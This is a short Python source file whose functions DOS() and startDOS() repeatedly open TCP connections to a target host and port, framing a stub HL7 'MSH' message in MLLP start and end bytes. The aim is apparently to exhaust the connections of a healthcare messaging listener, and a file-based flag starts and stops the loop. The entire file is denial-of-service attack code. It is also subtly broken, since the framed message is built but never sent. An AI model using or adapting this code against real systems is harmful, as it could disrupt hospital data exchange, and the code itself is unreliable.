import socket

def DOS(host,port,start):
    message="MSH"
    if start == 0:
        print("Closed")
    else:
        for i in range (1,999999):
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.settimeout(1)
                conn.connect((host, int(port)))

                # start and end block - used to define start and End of message in MLLP
                start_block = b'\x0b'
                end_block = b'\x1c'
                carriage_return = b'\x0d'

                # create message here
                msg = start_block.decode() + message + end_block.decode() + carriage_return.decode()

                try:
                    ack = conn.recv(4096)
                    if ack:
                        writeAck = ack.decode()
                        continue
                    else:
                        print("Exhausted all connections")
                except socket.timeout as e:
                    return e

            except socket.error as e:
                return("Exhausted all connections"+ str(e))

def startDOS(host,port,start):
    if start == 1:
        for i in range(1, 999999):
            dosTrackingFile = open('api/networkFiles/dosTrackingFile.txt', 'r')
            state = dosTrackingFile.read()
            dosTrackingFile.close()
            print(state)
            if int(state) ==1:
                DOS(host, port, start)
            else:
                break
    else:
        return